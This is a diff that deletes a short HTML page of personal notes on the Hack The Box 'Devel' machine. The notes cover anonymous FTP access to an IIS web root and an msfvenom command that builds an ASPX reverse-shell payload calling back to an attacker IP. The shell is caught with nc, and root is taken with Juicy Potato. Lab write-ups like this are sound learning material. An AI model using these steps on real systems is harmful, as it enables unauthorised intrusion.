@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>10.10.10.5 Devel2</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>10.10.10.5 Devel2</h1><br/>will windows 7 and newer execute asp? → not by default<br />nmap showed that ftp and http was running.<br />iis was version 7.5 indicating windows server 2008r2<br /><br />ftp anonymous was allowed, and host the web root.<br />msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.60 lport=3234 -f aspx -a x86 --platform win  &gt; 3234.aspx<br />upload 3234.aspx<br />navigate to website and catch with nc<br />first shell.<br /><br />whoami /all showed that seimpersonate was enabled. The machine is between 2008 and 2016 so we shoult be good with juicy potatox86<br />we are<br />rooted<br /><br /><br /><br /><br /><br /><br /><br /><br />VVVVVVVVVVV<br /><a href="https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/">https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/</a><br />^^^^^^^^^^^^^</div></body></html>
